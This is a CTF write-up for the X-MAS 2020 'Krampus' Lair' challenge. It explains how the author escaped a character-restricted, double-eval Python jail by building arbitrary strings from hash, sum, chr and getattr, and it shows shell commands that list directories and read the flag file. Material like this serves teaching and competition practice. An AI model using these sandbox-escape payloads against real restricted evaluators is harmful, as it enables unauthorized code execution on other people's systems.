---
title: "[CTF Writeup] X-MAS 2020 - Krampus' Lair"
date: 2020-12-19T21:34:00+09:00
tags:
  - ctf
  - python
---

**CTF**: [Xmas CTF 2020](https://xmas.htsp.ro/)  
**Challenge**: Krampus' Lair  
**Category**: Misc  
**Points**: 492  

```
YOU ARE ONE OF THE BRAVEST ADVENTURERS LAPLAND HAS EVER SEEN. TODAY IS THE DAY YOU DECIDE TO TAKE ON KRAMPUS.
WILL YOU FIGHT? OR WILL YOU PERISH LIKE A GOBLIN?
> █

Target: nc challs.xmas.htsp.ro 6001
Authors: PinkiePie1189, Milkdrop
```

Full code for my solution available [here.](https://gist.github.com/rynorris/b2431f9ec9421dc2319fea554d601709)

The first part of this challenge involves solving a simple text-based adventure game, navigating a map to collect a few items.
I won't cover that part here, since it's fairly simple.

The fun comes when you end up stuck in a python jail, with some rather unique restrictions.

```
YOU ARE NOW STUCK IN THE JAIL, AND YOU MUST ESCAPE IF YOU WANT TO SEE THE
LIGHT OF DAY EVER AGAIN. YOU HAVE ACQUIRED THE FOLLOWING ITEMS:

GEM
HUNTER SNARE
CAN
TIMER
) ( (BOW SET)
  ,
 / (ARROW)
v

YOU ARE ONLY ALLOWED TO USE THE (LOWERCASE) CHARACTERS THAT MAKE UP THESE ITEMS
IN ORDER TO CRAFT A PAYLOAD AND ESCAPE THE PYTHON JAIL. GOOD LUCK!
```

Explicitly, this means we can only use the characters `gemhuntersnarecantimer(),/v`.
So no numbers, no `.` for method calls, no quotes to make strings, etc.

I figured out the full parameters of the problem by entering `time`.

```
> time
You try double eval'ing your contraption: <module 'time' (built-in)>
Gah! Your payload just broke in your hands!
```

Aha!, so essentially the server is going to run `eval(eval(<user-input>))`.  So now I figure the goal is to construct a string in the inner `eval()`, which will then be able to execute without restrictions in the outer `eval()`.

First thing to do was take stock of what we actually _can_ do, since that list is actually very small.  Let's see which builtins we have available:

```python
>>> ALLOWED_CHARS = "gemhuntersnarecantimer(),/v"
>>> [f for f in dir(__builtins__) if all([c in ALLOWED_CHARS for c in f])]
['ascii', 'chr', 'enumerate', 'getattr', 'hasattr', 'hash', 'int', 'isinstance', 'iter', 'min', 'range', 'set', 'setattr', 'str', 'sum', 'vars']
```

We can use `hash()` on any object to get a number, I used `hash(int)`, but anything else would do too.

Then we can divide this by itself to get `1`.

Finally, we can use `sum(1,1,1,...)` to build any number we like!

```python
def one():
    return "int(hash(int)/hash(int))"

def integer(n):
    return "sum((" + ",".join([one()] * n) + "))"
```

Now we can use `chr()` to turn the numbers into characters.

All we need is a way to join the characters together to form a string.

I was stuck here for a while, but eventually figured out that `vars(x)` returns a dict of all the elements in a module or class, and `min(vars(x))` will return the name of one of the elements.  And it just so happens that `min(vars(str)) = "__add__"`!

Now we just have to put it all together:

```python
def string(s):
    chars = [char(c) for c in s]
    out = chars[0]
    for c in chars[1:]:
        out = "getattr(str,min(vars(str)))(" + out + "," + c + ")"

    return out
```

Finally, I set up a script which would navigate the initial maze, and then take input, "compile" it using the above function, and send that through to the server, essentially giving me a full python shell!

```
> print(__import__("os").listdir())
You try double eval'ing your contraption: 'print(__import__("os").listdir())'
['run', 'var', 'tmp', 'boot', 'etc', 'root', 'bin', 'media', 'opt', 'dev', 'proc', 'home', 'lib64', 'srv', 'usr', 'sbin', 'lib', 'mnt', 'sys', '.dockerenv', 'chall']
> print(__import__("os").listdir("chall"))
You try double eval'ing your contraption: 'print(__import__("os").listdir("chall"))'
['text.py', 'flag.txt', 'server.py', '__pycache__']
> print(open("chall/flag.txt").read())
You try double eval'ing your contraption: 'print(open("chall/flag.txt").read())'
X-MAS{70_f1gh7_Kr4mpu5_y0u_f1r57_mu57_br34k_0u7_0f_175_PYTH0N_J41L-017F485A}
```
